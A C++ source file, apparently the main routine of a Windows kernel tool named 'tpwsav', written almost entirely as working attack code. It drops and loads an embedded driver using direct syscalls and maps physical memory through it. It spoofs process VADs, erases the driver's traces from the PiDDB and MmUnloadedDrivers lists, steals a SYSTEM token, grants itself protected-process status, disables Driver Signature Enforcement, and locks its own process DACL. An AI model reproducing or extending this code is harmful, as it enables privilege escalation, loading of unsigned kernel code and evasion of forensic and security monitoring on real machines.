#include <windows.h>
#include <aclapi.h>
#include <shellapi.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "cleanup.h"
#include "protect.h"
#include "window.h"
#include "dse.h"
#include "driver_bytes.h"

#pragma comment(lib, "shell32.lib")

// Double-clicking goes through the shell, not an already-elevated terminal, so
// startup must guarantee: a visible console before the first printf, an
// elevated token, and that an early failure leaves the console up long enough
// to be read.

static bool IsElevated() {
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return false;

    TOKEN_ELEVATION info = {};
    DWORD size = sizeof(info);
    bool elevated = false;
    if (GetTokenInformation(token, TokenElevation, &info, sizeof(info), &size))
        elevated = info.TokenIsElevated != FALSE;
    CloseHandle(token);
    return elevated;
}

static void EnsureConsole() {
    if (!GetConsoleWindow()) {
        if (AllocConsole()) {
            FILE* f = NULL;
            freopen_s(&f, "CONIN$",  "r", stdin);
            freopen_s(&f, "CONOUT$", "w", stdout);
            freopen_s(&f, "CONOUT$", "w", stderr);
        }
    }

    // Unbuffered so nothing is lost if the console is closed mid-run.
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

	// Bring the console to the front, in case it was already open but hidden behind other windows.
    HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_SHOWNORMAL);
        SetForegroundWindow(console);
    }
}

// RelaunchElevated() is only called when the process is not elevated, so it is safe to use ShellExecuteExW() with the "runas" verb. 
// The function returns true
static bool RelaunchElevated() {
    wchar_t exePath[MAX_PATH] = {};
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
        return false;

    SHELLEXECUTEINFOW sei = {};
    sei.cbSize       = sizeof(sei);
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb       = L"runas";
    sei.lpFile       = exePath;
    sei.lpParameters = NULL;
    sei.lpDirectory  = NULL;
    sei.nShow        = SW_SHOWNORMAL;

    if (!ShellExecuteExW(&sei)) {
        DWORD err = GetLastError();
        if (err == ERROR_CANCELLED)
            printf("[-] Elevation cancelled\n");
        else
            printf("[-] Failed to relaunch elevated (error %lu)\n", err);
        return false;
    }
    if (sei.hProcess)
        CloseHandle(sei.hProcess);
    return true;
}

// The window/VAD work truncates VADs on purpose, so a fault there used to end the
// process with an unhandled STATUS_ACCESS_VIOLATION: the console closed and the
// only trace was in the system log. Every phase is tagged and Run() traps the
// exception, then restores the VAD tree - exiting with a truncated VAD still
// backed by a live section is a bugcheck waiting for the teardown path.
enum RunPhase {
    PH_STARTUP, PH_DROP, PH_LOAD, PH_WINDOW, PH_SPOOF, PH_CLEANUP,
    PH_UNLOAD, PH_RESTORE, PH_PPL, PH_VERIFY, PH_DSE, PH_DACL, PH_DONE
};

// The last exception is stored so the sweep can report it with the same detail
static RunPhase g_Phase = PH_STARTUP;
static EXCEPTION_POINTERS* g_LastException = NULL;

static const char* PhaseName(RunPhase p) {
    switch (p) {
        case PH_STARTUP: return "startup / offset resolution";
        case PH_DROP:    return "driver drop / service registry";
        case PH_LOAD:    return "driver load / device open";
        case PH_WINDOW:  return "physical window setup";
        case PH_SPOOF:   return "VAD spoof";
        case PH_CLEANUP: return "PiDDB / MmUnloadedDrivers cleanup";
        case PH_UNLOAD:  return "driver unload";
        case PH_RESTORE: return "VAD restore";
        case PH_PPL:     return "SYSTEM impersonation / PPL";
        case PH_VERIFY:  return "verification";
        case PH_DSE:     return "DSE disable";
        case PH_DACL:    return "process DACL lock";
        case PH_DONE:    return "shutdown";
    }
    return "unknown";
}

// No CRT in the crash path: the heap may be exactly what is broken.
static void RawWrite(const char* text) {
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    if (h == INVALID_HANDLE_VALUE || h == NULL) return;
    DWORD written = 0;
    WriteFile(h, text, (DWORD)lstrlenA(text), &written, NULL);
}

// The exception filter is called from the __except clause, so it can return EXCEPTION_EXECUTE_HANDLER to run the handler, or EXCEPTION_CONTINUE_SEARCH to let the exception propagate. 
// It stores the exception pointers for later reporting.
static int CrashFilter(EXCEPTION_POINTERS* ep) {
    g_LastException = ep;
    return EXCEPTION_EXECUTE_HANDLER;
}

// Restoring the VADs only writes pages that were already faulted in, but guard
// it anyway: this runs from an exception handler.
static void SafeRestore() {
    __try {
        RestorePhysWindow();
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        RawWrite("\r\n[!!!] VAD restore faulted too - the window itself is unusable\r\n");
    }
}

// Print the details of whatever exception was last trapped. Split out so the
// sweep's own handler can report with the same detail as the top level.
static void PrintCrashDetail(const char* what) {
    ULONG code = 0;
    ULONG64 rip = 0;
    if (g_LastException) {
        code = (ULONG)g_LastException->ExceptionRecord->ExceptionCode;
        rip = (ULONG64)g_LastException->ContextRecord->Rip;
    }
    char buf[400] = {};
    // wsprintfA does not understand %ll: it parses "%llX" as "%l" plus literal
    // "lX", consuming one argument and shifting every argument after it. Split
    // 64-bit values into dwords. A RIP in our own image is also only useful
    // relative to the image base, so report that too.
    ULONG64 selfBase = (ULONG64)(UINT_PTR)GetModuleHandleA(NULL);
    ULONG64 rel = (selfBase && rip >= selfBase && rip < selfBase + 0x01000000ULL)
                    ? rip - selfBase : 0;
    wsprintfA(buf,
        "\r\n[!!!] %s hit an exception 0x%08lX\r\n"
        "[!!!] at RIP 0x%08lX%08lX (image 0x%08lX%08lX, offset 0x%08lX%08lX)\r\n",
        what, (unsigned long)code,
        (unsigned long)(rip >> 32), (unsigned long)rip,
        (unsigned long)(selfBase >> 32), (unsigned long)selfBase,
        (unsigned long)(rel >> 32), (unsigned long)rel);
    RawWrite(buf);
}

// The exception handler is called from the __except clause, so it can only call functions that are safe to run from an exception handler. 
// It reports the exception and restores any VADs that were truncated, so the process can exit cleanly.
static void ReportCrash() {
    ULONG patches = (ULONG)WindowVadPatchCount();
    PrintCrashDetail("the run");

    char buf[200] = {};
    wsprintfA(buf, "[!!!] %u VAD patch(es) still applied - restoring them now\r\n", patches);
    RawWrite(buf);

    SafeRestore();
}

// The name sweep is best-effort trace cleanup. It must never take the tool down
// with it, so any exception in it ends the sweep rather than the run - but it is
// reported in full, because a silently skipped sweep is a silent failure.
static bool IsSystemToken(HANDLE hToken) {
    if (!hToken) return false;
    BYTE buf[256] = {};
    DWORD needed = 0;
    if (!GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &needed))
        return false;
    BYTE sid[SECURITY_MAX_SID_SIZE] = {};
    DWORD sz = sizeof(sid);
    if (!CreateWellKnownSid(WinLocalSystemSid, NULL, sid, &sz))
        return false;
    return EqualSid(((TOKEN_USER*)buf)->User.Sid, sid);
}

static int RunBody();

static int Run() {
    __try {
        return RunBody();
    }
    __except (CrashFilter(GetExceptionInformation())) {
        ReportCrash();
        return 3;
    }
}

// RunBody() is the main body of the run, with all the steps that can fault. 
// It is split out so the exception filter can be set up in Run(), and so the sweep can report the same detail as the top level.
static int RunBody() {
    printf("[*] tpwsav\n\n");

    printf("[*] Resolving syscalls...\n");
    SyscallTable sc = {};
    if (!ResolveSyscalls(&sc)) {
        printf("[-] Failed to resolve syscalls\n");
        return 1;
    }

    KernelOffsets kOffsets = {};
    if (!ResolveKernelOffsets(&kOffsets)) {
        printf("[-] Failed to resolve kernel offsets\n");
        return 1;
    }

    // Show what the platform enforces, so a later failure has it in the log.
    // VBS/HVCI changes the memory budget, so the commit numbers further down are
    // not comparable with a non-VBS boot.
    {
        typedef NTSTATUS(WINAPI* pNtQSI)(ULONG, PVOID, ULONG, PULONG);
        auto NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                            "NtQuerySystemInformation");
        ULONG ciOptions = 0, need = 0;
        if (NtQSI && NtQSI(103, &ciOptions, sizeof(ciOptions), &need) == 0)
            printf("[+] code integrity options: 0x%X%s\n", ciOptions,
                   (ciOptions & 0x20) ? "  (HVCI: kernel-mode code integrity)" : "");
        else
            printf("[+] code integrity options: not available\n");
        if (IsProcessorFeaturePresent(21))  // PF_VIRT_FIRMWARE_ENABLED
            printf("[+] virtualization: enabled in firmware\n");
    }

    // The DSE step needs ci.dll!g_CiOptions' RVA, and finding it means
    // downloading that PDB and running DIA over it - the most memory-hungry
    // thing here. Do it now, while memory is plentiful: after the window has
    // committed its gigabytes the same work can fail with STATUS_NO_MEMORY.
    ULONG64 ciOptionsRva = 0;
    bool haveCiOptionsRva = ResolveCiOptionsRva(&ciOptionsRva);

	// The driver drop and load steps need SeLoadDriverPrivilege, so enable it now. 
    // The privilege is not needed for the rest of the run, so it is not left enabled.
    printf("\n[*] Enabling SeLoadDriverPrivilege...\n");
    {
        HANDLE tokenHandle;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenHandle);

		// The privilege is enabled for the current process, so it is inherited by the driver load thread. 
        // The privilege is not needed for the rest of the run, so it is not left enabled.
        TOKEN_PRIVILEGES tp = {};
        LookupPrivilegeValueW(NULL, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(tokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);

		// AdjustTokenPrivileges() always returns TRUE, so check GetLastError() to see if it actually succeeded.
        if (GetLastError() != 0) {
            printf("[-] Failed to enable SeLoadDriverPrivilege\n");
            return 1;
        }
        CloseHandle(tokenHandle);
        printf("[+] SeLoadDriverPrivilege enabled\n");
    }

	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide. 
    // The file is created with FILE_OVERWRITE_IF so that if the same tick count is used twice in a row, the second run will overwrite the first file instead of failing to create it.
    printf("\n[*] Dropping driver to temp...\n");
    g_Phase = PH_DROP;

	// The temp path is used to avoid any permission issues, and the file is deleted after the driver is loaded.
    wchar_t tempDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tempDir);

	// Use the tick count to generate a unique name for the driver file. 
    // This helps avoid collisions if the tool is run multiple times in quick succession.
    DWORD tick = (DWORD)GetTickCount64();
    wchar_t svcName[32] = {};
    wsprintfW(svcName, L"tmp%X", tick);

	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide.
    wchar_t dropPath[MAX_PATH] = {};
    wsprintfW(dropPath, L"%s%s.sys", tempDir, svcName);

	// The driver bytes are written to the temp file. If the write fails, the tool exits with an error.
    wchar_t ntPath[MAX_PATH] = {};
    wsprintfW(ntPath, L"\\??\\%s", dropPath);

	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide.
    HANDLE fileHandle = NULL;
    IO_STATUS_BLOCK ioStatus = {};
    UNICODE_STRING filePath;
    OBJECT_ATTRIBUTES fileAttrs;

	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide.
    InitUnicodeString(&filePath, ntPath);
    InitializeObjectAttributes(&fileAttrs, &filePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// The file is created with FILE_OVERWRITE_IF so that if the same tick count is used twice in a row, the second run will overwrite the first file instead of failing to create it.
    NTSTATUS status = DoSyscallEx(
        sc.NtCreateFile,
        (ULONG_PTR)&fileHandle,
        (ULONG_PTR)(GENERIC_WRITE | SYNCHRONIZE),
        (ULONG_PTR)&fileAttrs,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)NULL,
        (ULONG_PTR)FILE_ATTRIBUTE_NORMAL,
        (ULONG_PTR)FILE_SHARE_READ,
        (ULONG_PTR)5,   // FILE_OVERWRITE_IF
        (ULONG_PTR)0x20, // FILE_SYNCHRONOUS_IO_NONALERT
        (ULONG_PTR)NULL,
        (ULONG_PTR)0
    );

	// The file is created with FILE_OVERWRITE_IF so that if the same tick count is used twice in a row, the second run will overwrite the first file instead of failing to create it.
    if (status != 0) {
        printf("[-] Failed to create temp file: 0x%lX\n", status);
        return 1;
    }

	// The driver bytes are written to the temp file. If the write fails, the tool exits with an error.
    ioStatus = {};
    status = DoSyscallEx(
        sc.NtWriteFile,
        (ULONG_PTR)fileHandle,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)g_DriverBytes,
        (ULONG_PTR)g_DriverSize,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        0, 0
    );

	// The file handle is closed after the write operation.
    DoSyscall(sc.NtClose, (ULONG_PTR)fileHandle, 0, 0, 0);

    if (status != 0) {
        printf("[-] Failed to write driver bytes: 0x%lX\n", status);
        return 1;
    }

	// The driver is dropped to a temp file with a name based on the tick count, so that two runs in a row do not collide.
    printf("[+] Dropped %u bytes\n", g_DriverSize);

	// The service registry key is created for the driver.
    printf("\n[*] Creating service registry key...\n");
    UNICODE_STRING keyPath;
    wchar_t svcRegPath[MAX_PATH] = {};
    wsprintfW(svcRegPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s", svcName);
    InitUnicodeString(&keyPath, svcRegPath);

	// The service registry key is created for the driver.
    OBJECT_ATTRIBUTES keyAttrs;
    InitializeObjectAttributes(&keyAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE keyHandle = NULL;
    ULONG disposition = 0;

	// The service registry key that is created for the driver.
    status = DoSyscallEx(
        sc.NtCreateKey,
        (ULONG_PTR)&keyHandle,
        (ULONG_PTR)KEY_ALL_ACCESS,
        (ULONG_PTR)&keyAttrs,
        (ULONG_PTR)0,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0,
        (ULONG_PTR)&disposition,
        0, 0, 0, 0
    );

    if (status != 0) {
        printf("[-] NtCreateKey failed: 0x%lX\n", status);
        return 1;
    }

    UNICODE_STRING imagePathName;
    InitUnicodeString(&imagePathName, L"ImagePath");

	// The ImagePath value is set to the path of the driver file.
    status = DoSyscallEx(
        sc.NtSetValueKey,
        (ULONG_PTR)keyHandle,
        (ULONG_PTR)&imagePathName,
        (ULONG_PTR)0,
        (ULONG_PTR)REG_EXPAND_SZ,
        (ULONG_PTR)ntPath,
        (ULONG_PTR)((wcslen(ntPath) + 1) * sizeof(wchar_t)),
        0, 0, 0, 0, 0
    );

    if (status != 0) {
        printf("[-] Failed to set ImagePath: 0x%lX\n", status);
        return 1;
    }

    // The Type value is set to 1 (kernel-mode driver).
    UNICODE_STRING typeName;
    InitUnicodeString(&typeName, L"Type");
    DWORD driverType = 1;

    status = DoSyscallEx(
        sc.NtSetValueKey,
        (ULONG_PTR)keyHandle,
        (ULONG_PTR)&typeName,
        (ULONG_PTR)0,
        (ULONG_PTR)REG_DWORD,
        (ULONG_PTR)&driverType,
        (ULONG_PTR)sizeof(driverType),
        0, 0, 0, 0, 0
    );

    DoSyscall(sc.NtClose, (ULONG_PTR)keyHandle, 0, 0, 0);

    if (status != 0) {
        printf("[-] Failed to set Type: 0x%lX\n", status);
        return 1;
    }

	// The service registry key is created for the driver.
    printf("[+] Service key created\n");

	// The driver is loaded using NtLoadDriver. 
    // If the driver is already loaded, it will reuse the existing driver.
    printf("\n[*] Loading driver...\n");
    g_Phase = PH_LOAD;

    UNICODE_STRING servicePath;
    InitUnicodeString(&servicePath, svcRegPath);

    status = DoSyscall(
        sc.NtLoadDriver,
        (ULONG_PTR)&servicePath,
        0, 0, 0
    );

    if (status == 0xC000010E || status == 0xC0000035) {
        printf("[*] Driver already loaded (0x%lX), reusing\n", status);
    } else if (status != 0) {
        printf("[-] NtLoadDriver failed: 0x%lX\n", status);
        return 1;
    } else {
        printf("[+] Driver loaded\n");
    }

    DeleteFileW(dropPath);

    printf("\n[*] Opening device handle...\n");

    HANDLE deviceHandle = NULL;
    ioStatus = {};
    UNICODE_STRING devicePath;
    OBJECT_ATTRIBUTES deviceAttrs;

	// The device path is set to the symbolic link created by the driver.
    InitUnicodeString(&devicePath, L"\\DosDevices\\EBIoDispatch");
    InitializeObjectAttributes(&deviceAttrs, &devicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = DoSyscallEx(
        sc.NtCreateFile,
        (ULONG_PTR)&deviceHandle,
        (ULONG_PTR)(GENERIC_READ | GENERIC_WRITE),
        (ULONG_PTR)&deviceAttrs,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0,
        (ULONG_PTR)0,
        (ULONG_PTR)3,
        (ULONG_PTR)0,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0
    );

    if (status != 0) {
        printf("[-] Failed to open device: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Device handle: 0x%p\n", deviceHandle);

    printf("\n[*] Finding System CR3...\n");

	// The System CR3 is the page table base for the kernel. It is needed to access kernel memory and manipulate VADs.
    ULONG64 systemCr3 = FindSystemCr3(deviceHandle, &sc, kOffsets.NtoskrnlBase);
    if (!systemCr3) {
        printf("[-] Failed to find System CR3\n");
        return 1;
    }
    printf("[+] System CR3: 0x%llX\n", systemCr3);

    g_Phase = PH_WINDOW;
    if (!SetupPhysWindow(deviceHandle, &sc, systemCr3, &kOffsets)) {
        printf("[-] Failed to set up physical memory window\n");
        return 1;
    }

	// The VAD spoofing step modifies the VADs of the current process to claim a large section of memory, which is used to bypass certain security checks. 
    // This is done through the physical memory window set up earlier.
    g_Phase = PH_SPOOF;
    SpoofWindowVADs(deviceHandle, &sc, systemCr3, &kOffsets);

	// The PiDDB and MmUnloadedDrivers cleanup step removes traces of the driver from the system.
    g_Phase = PH_CLEANUP;
    printf("\n[*] Trace cleanup\n");

    wchar_t driverFileName[64] = {};
    wsprintfW(driverFileName, L"%s.sys", svcName);
    CleanPiDDBCache(deviceHandle, &sc, systemCr3, &kOffsets, driverFileName);

    MmCleanupContext mmCtx = {};
    bool mmPrepared = PrepareMmCleanup(deviceHandle, &sc, systemCr3, &kOffsets,
                                      driverFileName, &mmCtx);

    // Put the VADs back before anything else touches the window again (PPL, DSE,
    // verification): a VAD claiming 64 KiB for a 1 GiB section is what makes those
    // steps fault, and this way the process can never exit - cleanly or not -
    // with a truncated VAD in place.
    g_Phase = PH_RESTORE;
    RestorePhysWindow();

    // The driver is unloaded using NtUnloadDriver.
    g_Phase = PH_UNLOAD;
    printf("\n[*] Unloading driver...\n");
    DoSyscall(sc.NtClose, (ULONG_PTR)deviceHandle, 0, 0, 0);

    status = DoSyscall(sc.NtUnloadDriver, (ULONG_PTR)&servicePath, 0, 0, 0);
    printf("[%c] Driver unloaded\n\n", status == 0 ? '+' : '-');

    if (mmPrepared && status == 0)
        FinishMmCleanup(&mmCtx);

	// The service registry key is deleted after the driver is unloaded.
    InitializeObjectAttributes(&keyAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = DoSyscallEx(
        sc.NtCreateKey,
        (ULONG_PTR)&keyHandle,
        (ULONG_PTR)KEY_ALL_ACCESS,
        (ULONG_PTR)&keyAttrs,
        0, 0, 0,
        (ULONG_PTR)&disposition,
        0, 0, 0, 0
    );
    if (status == 0) {
        DoSyscall(sc.NtDeleteKey, (ULONG_PTR)keyHandle, 0, 0, 0);
        DoSyscall(sc.NtClose, (ULONG_PTR)keyHandle, 0, 0, 0);
    }
    printf("[+] Registry key deleted\n");

    g_Phase = PH_PPL;
    // Primary token first: this is what makes the *process* SYSTEM. The thread
    // impersonation below is a fallback for when the swap is refused.
    SetProcessSystemToken(systemCr3, &kOffsets);

    // The console host was spawned by CSRSS back in EnsureConsole(), long
    // before any of this ran, so it is still running as the original account.
    // If we own the console, bring its host up to the same state as us.
    if (GetConsoleWindow()) {
        if (!MatchChildToSystem(systemCr3, &kOffsets, L"conhost.exe"))
            printf("[-] No conhost child found to match (fine if run from a terminal)\n");
    }

    if (!ImpersonateSystem())
        printf("[-] Failed to impersonate SYSTEM on this thread\n");

    // PPL via physical memory window — no driver needed
    {
        ULONG64 ourEprocessVA = 0;
        if (WindowFindOurEprocess(systemCr3, &kOffsets, &ourEprocessVA)) {
            printf("[*] Our EPROCESS: 0x%llX (Protection off 0x%X)\n",
                   ourEprocessVA, kOffsets.Protection);
            WindowSetProcessPpl(systemCr3, &kOffsets, ourEprocessVA, PPL_FULL_WINSYSTEM);
        } else {
            printf("[-] PPL: could not locate our EPROCESS\n");
        }
    }

    g_Phase = PH_VERIFY;
    printf("\n[*] Verification\n");

    __try {
        ULONG64 ntPhys = WindowVirtToPhys(systemCr3, kOffsets.NtoskrnlBase);
        if (ntPhys) {
            USHORT mz = (USHORT)WindowRead32(ntPhys);
            printf("[%c] VirtToPhys: %s\n", mz == 0x5A4D ? '+' : '-',
                   mz == 0x5A4D ? "OKAY" : "FAILED");
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] VirtToPhys: FAILED\n");
    }

    {
		// PPL is a process-wide setting, so NtQueryInformationProcess is the only way to read it back. 
        // The physical memory window can only read the current process' EPROCESS.
        typedef NTSTATUS(WINAPI* fnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        auto NtQIP = (fnNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        if (NtQIP) {
            BYTE level = 0;
            ULONG len = 0;
            NTSTATUS s = NtQIP(GetCurrentProcess(), 61, &level, sizeof(level), &len);
            printf("[%c] PPL: 0x%02X%s\n", (s == 0 && level == PPL_FULL_WINSYSTEM) ? '+' : '-',
                   level,
                   (s == 0 && level == PPL_FULL_WINSYSTEM) ? "" : "  (wanted 0x44)");
            printf("    PPL value now: 0x%02X\n", level);
        }
    }

    // Re-read the bytes at the end of the run. If they differ from what was
    // written, something in between rewrote them.
    {
        ULONG64 ourEproc = 0;
        if (WindowFindOurEprocess(systemCr3, &kOffsets, &ourEproc)) {
            printf("[*] PPL value: ours 0x%02X\n",
                   WindowGetProcessProtection(systemCr3, &kOffsets, ourEproc));
        }
        ReportChildProtection(systemCr3, &kOffsets, L"conhost.exe");
    }

    {
        // Report the two tokens separately. The thread token is what API calls
        // in this thread are checked against; the primary token is what the
        // process actually is. Reporting only the thread token makes a process
        // that is still running as admin look like SYSTEM.
        HANDLE procTok = NULL, threadTok = NULL;
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &procTok);
        OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &threadTok);

        bool sys = IsSystemToken(procTok);
        bool thr = IsSystemToken(threadTok);
        printf("[%c] Process token: %s\n", sys ? '+' : '-', sys ? "SYSTEM" : "NOT SYSTEM");
        printf("[%c] Thread token:  %s\n", thr ? '+' : '-', thr ? "SYSTEM" : "NOT SYSTEM");
        if (procTok) CloseHandle(procTok);
        if (threadTok) CloseHandle(threadTok);
    }

    printf("[+] System CR3: 0x%llX\n", systemCr3);

    g_Phase = PH_DSE;
    DisableDSE(systemCr3, &kOffsets, haveCiOptionsRva, ciOptionsRva);

    // Last: the deny ACE covers this process too, so nothing that needs to open
    // it may run after this point.
    g_Phase = PH_DACL;
    LockProcessDACL();

    g_Phase = PH_DONE;
    printf("\n[*] Press Enter to exit...\n");
    (void)getchar();

    // No-op unless a crash path left something patched, but keep it as a net.
    RestorePhysWindow();
    return 0;
}

int main() {
    EnsureConsole();

    if (!IsElevated()) {
        printf("[*] Administrator privileges required, elevating...\n");
        if (RelaunchElevated())
            return 0;

        printf("[-] Could not obtain administrator privileges.\n");
        printf("[*] Right-click tpwsav.exe and choose 'Run as administrator'.\n");
        printf("\nPress Enter to exit...");
        (void)getchar();
        return 1;
    }

    int rc = Run();
    if (rc != 0) {
        // When launched by double-click nothing keeps the window alive after
        // a failure, so the console just flashes. Let the error be read.
        printf("\nPress Enter to exit...");
        (void)getchar();
    }
    return rc;
}
